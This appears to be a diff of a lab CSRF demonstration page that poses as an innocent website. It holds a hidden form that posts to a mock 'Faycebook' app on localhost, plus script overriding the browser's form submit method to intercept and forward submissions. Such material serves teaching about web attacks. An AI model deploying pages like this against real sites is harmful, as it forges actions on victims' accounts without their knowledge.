@@ -4,6 +4,7 @@
 </head>
 <body>
   <h1>I am an innocent website!</h1> 
+  <small>dat CSRF dou</small>
   <form name="attackFaycebook" method="POST"
   action="http://localhost:5000/faycebook/add" target="hidden-form">
     <input type="hidden" name="date" value="2014-04-01T22:50:49.762475" />
@@ -18,7 +19,7 @@
       // override submit handling
       HTMLFormElement.prototype.real_submit = HTMLFormElement.prototype.submit;
       HTMLFormElement.prototype.submit = interceptor;
-      console.log("interceptor_setup is called");
+      //console.log("interceptor_setup is called");
 
       // define our 'submit' handler on window, to avoid defining
       // on individual forms
@@ -36,13 +37,13 @@
     // or as a result of submit handler on window (arg: event)
     function interceptor(e) {
       var frm = e ? e.target : this;
-      console.log("interceptor(e) got called");
+      //console.log("interceptor(e) got called");
 //      if (frm.action.indexOf('faycebook') != -1) {
       if (false) {
-        console.log('Attacking Faycebook la!');
+        //console.log('Attacking Faycebook la!');
         return false;
       } else {
-        console.log('not attacking facebook, forwarding the form request');
+        //console.log('not attacking facebook, forwarding the form request');
         HTMLFormElement.prototype.real_submit.apply(frm);
       }
     }
